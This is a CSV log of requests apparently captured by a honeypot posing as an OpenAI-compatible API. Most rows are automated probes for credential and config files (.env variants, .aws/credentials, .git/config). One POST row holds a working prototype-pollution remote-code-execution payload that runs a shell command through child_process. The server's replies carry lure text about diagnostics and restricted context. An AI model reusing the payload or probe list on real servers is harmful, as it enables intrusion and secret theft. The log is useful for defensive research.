request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
0ac06f76-9ca4-4db3-9590-1854973527f7,2026-04-03T18:49:54.122427+00:00,anon_4f938521,GET,/.env.test,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9f6756fe-1b9c-40a9-93b8-788ca3cb6920,2026-04-03T18:49:55.340148+00:00,anon_4f938521,GET,/dev/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e67ffda7-7395-4e68-9bb4-2625ad53b426,2026-04-03T18:49:57.142398+00:00,anon_4f938521,GET,/.aws/credentials,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f03c1b82-aeb4-42a3-8a97-1a69ea0c330e,2026-04-03T18:49:58.191984+00:00,anon_4f938521,GET,/.env.ci,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
150850a3-4b46-490e-9329-87d5948f8c53,2026-04-03T18:49:59.491408+00:00,anon_4f938521,GET,/.env.config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2ca18869-56d7-4408-88d1-45ccfd98b64f,2026-04-03T18:50:00.273604+00:00,anon_4f938521,GET,/configuration/.env,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
eb8e55e9-e7d9-4609-a89d-e0e4894ce031,2026-04-03T18:50:01.259373+00:00,anon_4f938521,GET,/app/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
78846c4b-2ca5-41bc-822e-77316ca925b0,2026-04-03T18:50:02.378595+00:00,anon_4f938521,GET,/.env.production,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8d3ce96e-8b50-45af-af7a-0f516fc42097,2026-04-03T18:50:04.051945+00:00,anon_4f938521,GET,/data/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a3607fe9-3c9e-433f-b993-5192cb71e512,2026-04-03T18:50:05.189186+00:00,anon_4f938521,GET,/public/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
bb9a90ab-cc03-4750-818e-f40d010334cf,2026-04-03T18:50:06.307788+00:00,anon_4f938521,GET,/config.json,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8b1f1dde-e4ef-4020-a402-4135533eca02,2026-04-03T18:50:08.035065+00:00,anon_4f938521,GET,/.env.backup,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
1b97890e-afe2-4cfc-9280-4915db8f948b,2026-04-03T18:50:09.282562+00:00,anon_4f938521,GET,/.env.save,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
093510ce-be88-43ad-bdce-87948dd13ec4,2026-04-03T18:50:10.505032+00:00,anon_4f938521,GET,/backup/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7e299239-f543-4f83-9520-07e44123f9f7,2026-04-03T18:50:11.602492+00:00,anon_4f938521,GET,/.env.prod.local,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
b4b54655-9e4b-4011-b330-67d61b3ab903,2026-04-03T18:50:12.616508+00:00,anon_4f938521,GET,/.env.qa,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2d7e2095-ead6-45d4-9bb6-6d52ab6e893d,2026-04-03T18:50:13.963183+00:00,anon_4f938521,GET,/.env.staging.local,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
32c0d8d0-29bb-4d8e-8ccb-dcb8134b5115,2026-04-03T18:50:15.132219+00:00,anon_4f938521,GET,/files/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e6e0640b-bb67-4254-8d48-5c413f93e0af,2026-04-03T18:50:16.302714+00:00,anon_4f938521,GET,/.env.development.local,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d36a247b-6a71-4ce8-99f3-8f118f2f5ca1,2026-04-03T18:50:17.639612+00:00,anon_4f938521,GET,/config/.env,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
2acd5b30-40a6-4cae-9cb1-0676cd6e5d66,2026-04-03T18:50:18.749287+00:00,anon_4f938521,GET,/assets../.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9e199195-c971-423a-8f37-e4a159daacc8,2026-04-03T18:50:19.807782+00:00,anon_4f938521,GET,/api/.env,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
30714df2-3081-4bc7-a1fe-7ef00b1c781a,2026-04-03T18:50:21.242034+00:00,anon_4f938521,GET,/project/.git/config,[honeypot-host],l9explore/1.2.2,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3ec6162b-296e-412a-abd8-ca408d400baa,2026-04-03T18:56:49.772285+00:00,anon_d3ba50ad,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
50672b26-d241-4a1a-8f38-4ed5311fe718,2026-04-03T18:59:07.126025+00:00,anon_d3ba50ad,GET,/,[honeypot-host],visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
629b567d-9b8d-4219-9ca7-615f536b4462,2026-04-03T20:09:11.873015+00:00,anon_76d896a8,GET,/login.cgi,,r00ts3c,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c83e9735-c642-493d-84f9-ff979e947289,2026-04-03T20:25:17.139501+00:00,anon_a65fba78,GET,/,[honeypot-host],,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
122b9852-acf9-40b2-9ecd-77365a8e6505,2026-04-03T20:57:48.138437+00:00,anon_b0eacb2e,GET,/,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d4ae84cb-a8be-43e0-9d12-04f1d6560a45,2026-04-03T20:57:53.399636+00:00,anon_b0eacb2e,GET,/,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d2e21109-4202-4121-847d-3e7bada83170,2026-04-03T20:57:57.154844+00:00,anon_b0eacb2e,GET,/,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
6f29383d-f14f-4f5a-b69c-1caaf73384f8,2026-04-03T20:59:52.277371+00:00,anon_f03d15aa,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
57f539a0-5f4c-489a-b3b9-cdb14976f951,2026-04-03T20:59:52.806777+00:00,anon_f03d15aa,POST,/,[honeypot-host],Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,690,316,1,,"------WebKitFormBoundary63ce2fb5f9e38e9d
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"",""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundary63ce2fb5f9e38e9d
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundary63ce2fb5f9e38e9d
Content-Disposition: form-data; name=""2""

[]
------WebKitFormBoundary63ce2fb5f9e38e9d--","------WebKitFormBoundary63ce2fb5f9e38e9d
Content-Disposition: form-data; name=""0""

{""then"":""$1:__proto__:then"",""status"":""resolved_model"",""reason"":-1,""value"":""{\""then\"":\""$B1337\""}"",""_response"":{""_prefix"":""var res=process.mainModule.require('child_process').execSync('pwd').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"",""_chunks"":""$Q2"",""_formData"":{""get"":""$1:constructor:constructor""}}}
------WebKitFormBoundary63ce2fb5f9e38e9d
Content-Disposition: form-data; name=""1""

""$@0""
------WebKitFormBoundary63ce2fb5f9e38e9d
Content-Disposition: form-data; name=""2""

[]
------WebKitFormBoundary63ce2fb5f9e38e9d--",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d65fdccd-3936-4386-9313-c12318d42e67,2026-04-03T21:20:10.759795+00:00,anon_0f4e2a20,GET,/ping.cgi,,r00ts3c,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ccbd3479-898a-40a0-aeb5-3b41626925cd,2026-04-03T21:22:48.062670+00:00,anon_d85c67cc,GET,/.git/config,[honeypot-host],Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a91533fb-0c10-43b4-be97-c755d8c13b5c,2026-04-03T21:28:00.594215+00:00,anon_c41ba354,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
ed2a0daa-a24b-4267-ab1f-e353d19ba3bd,2026-04-03T21:40:42.451864+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
d133cce3-78d2-4a24-90a5-577886f94e07,2026-04-03T22:40:18.610732+00:00,anon_b8696860,GET,/,[honeypot-host],Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
954ceb97-c145-41fd-8e2a-132624772642,2026-04-03T22:40:22.919847+00:00,anon_d85c67cc,GET,/.git/config,[honeypot-host],"Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a744b5bb-5fea-4bc7-b9c9-fd738d993d01,2026-04-03T23:06:15.244428+00:00,anon_34a8cdac,GET,/,[honeypot-host],Linux Gnu (cow) ,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e9681cb7-de82-4681-ad84-2bf83d3e9282,2026-04-03T23:21:37.949055+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
c67dc046-9bac-4fb1-bbc4-b2547c9bed29,2026-04-03T23:31:22.692115+00:00,anon_beeacfd9,GET,/,[honeypot-host],Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
73dc3536-bf19-4174-af43-3c671bde653f,2026-04-03T23:57:38.537572+00:00,anon_2971d708,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
830ab88a-fc44-4d56-a3d0-1c569b9ccdbb,2026-04-03T23:57:58.032847+00:00,anon_d4028a4b,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
0272a0c4-dc79-4ea5-8975-c05d1ea7842c,2026-04-04T00:01:56.293743+00:00,anon_bf0a069b,GET,/,[honeypot-host],Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
